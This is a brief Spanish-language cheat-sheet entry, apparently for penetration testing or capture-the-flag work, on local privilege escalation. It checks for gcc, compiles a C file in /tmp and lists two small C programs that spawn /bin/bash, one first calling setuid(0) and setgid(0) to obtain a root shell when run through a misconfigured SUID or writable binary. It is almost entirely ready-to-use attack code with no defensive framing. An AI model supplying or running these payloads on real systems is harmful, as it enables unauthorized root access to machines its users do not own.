Buscamos si tiene la maquina gcc para compilar 

```
$ which gcc
/usr/bin/gcc

Creamos binario de c en /tmp copiamos el codigo a ejecutar y lo compilamos de la siguiente manera

gcc exploit.c -o exploit
```


Codigos que nos otorga una bash
```
#include<unistd.h>
int main()
{ setuid(0);
  setgid(0);
  system("/bin/bash");
}
```

```
#include <stdio.h>
#include <stdlib.h>

int main(void){
    system("/bin/bash");
    return 0;
}
```